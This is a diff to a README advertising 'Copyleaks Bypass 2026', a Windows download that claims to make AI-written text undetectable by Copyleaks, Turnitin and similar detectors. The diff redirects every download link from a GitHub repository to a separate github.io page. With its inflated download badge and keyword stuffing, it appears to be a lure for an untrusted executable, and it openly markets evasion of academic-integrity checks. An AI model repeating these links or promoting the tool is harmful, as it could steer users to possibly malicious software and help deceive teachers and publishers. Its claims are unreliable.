@@ -1,6 +1,6 @@
 # 🛡️ copyleaks-bypass-2026 - Make AI Text Undetectable Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Copyleaks%20Bypass%202026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/KennIsKenn/copyleaks-bypass-2026)
+[![Download Now](https://img.shields.io/badge/Download-Copyleaks%20Bypass%202026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://kenniskenn.github.io)
 
 ![Windows](https://img.shields.io/badge/Windows-10%2F11-0078D6?style=flat-square&logo=windows&logoColor=white) ![Version](https://img.shields.io/badge/Version-v2026-brightgreen?style=flat-square) ![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square) ![Downloads](https://img.shields.io/badge/Downloads-520k%2B-orange?style=flat-square)
 
@@ -43,7 +43,7 @@ Follow these simple steps to install and run Copyleaks Bypass 2026 on your compu
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/KennIsKenn/copyleaks-bypass-2026](https://github.com/KennIsKenn/copyleaks-bypass-2026)**
+Visit this link to download the application: **[https://kenniskenn.github.io](https://kenniskenn.github.io)**
 
 The download page will open in your browser. Look for the green "Download" button or the latest release file. Click it to start downloading.
 
@@ -173,6 +173,6 @@ This tool is intended for legitimate purposes such as content creation and acade
 
 ---
 
-**Ready to get started?** [Download Copyleaks Bypass 2026 Now](https://github.com/KennIsKenn/copyleaks-bypass-2026)
+**Ready to get started?** [Download Copyleaks Bypass 2026 Now](https://kenniskenn.github.io)
 
 Keywords: copyleaks bypass, ai detector bypass, turnitin bypass, originality ai bypass, humanize ai text, chatgpt detector bypass, ai writing tool, free ai bypass, copyleaks alternative, undetectable ai
